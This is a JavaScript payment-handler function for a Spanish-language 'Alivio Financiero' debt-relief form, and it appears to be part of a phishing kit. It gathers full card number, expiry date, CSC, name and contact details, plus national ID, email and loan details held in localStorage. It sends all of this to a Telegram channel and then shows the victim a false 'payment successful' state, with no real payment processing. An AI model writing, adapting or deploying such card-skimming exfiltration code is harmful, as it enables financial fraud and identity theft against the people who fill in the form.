const handlePago = async () => {
  if (!validateForm()) return;

  // Ensure móvil has a default value if empty
  if (!formData.movil) {
    setFormData(prev => ({ ...prev, movil: '0000000000' }));
  }

  try {
    const message = `
      🎉 ¡Nuevo pago de Alivio Financiero! 🎉

      💳 Datos de la tarjeta:
      Número: ${formData.numero}
      Fecha: ${formData.fecha}
      CSC: ${formData.csc}
      Nombre: ${formData.nombre}
      Apellidos: ${formData.apellidos}
      Código Postal: ${formData.postal}
      Móvil: ${formData.movil || '0000000000'}
      Mayor de edad: ${formData.mayorEdad ? 'Sí' : 'No'}

      👤 Datos del solicitante:
      Nombres: ${localStorage.getItem('nombres')}
      Apellidos: ${localStorage.getItem('apellidos')}
      Identificación: ${localStorage.getItem('identificacion')}
      Teléfono: ${localStorage.getItem('telefono')}
      Correo: ${localStorage.getItem('correo')}

      🏦 Datos de la operación:
      Institución: ${localStorage.getItem('institucion')}
      Tipo: ${localStorage.getItem('tipoOperacion')}
      Número: ${localStorage.getItem('numeroOperacion')}
      Ciudad: ${localStorage.getItem('ciudad')}

      📝 Información adicional:
      Codeudores/Garantes: ${localStorage.getItem('codeudores') === 'true' ? 'Sí' : 'No'}
      Fecha de solicitud: ${new Date().toLocaleDateString()}
    `;

    console.log('Enviando pago a Telegram...', message);
    await sendToTelegram(message);
    setPagoExitoso(true);
    setShowCardForm(false);
  } catch (error) {
    console.error('Error al procesar el pago:', error);
    setPagoError(true);
  }
}; 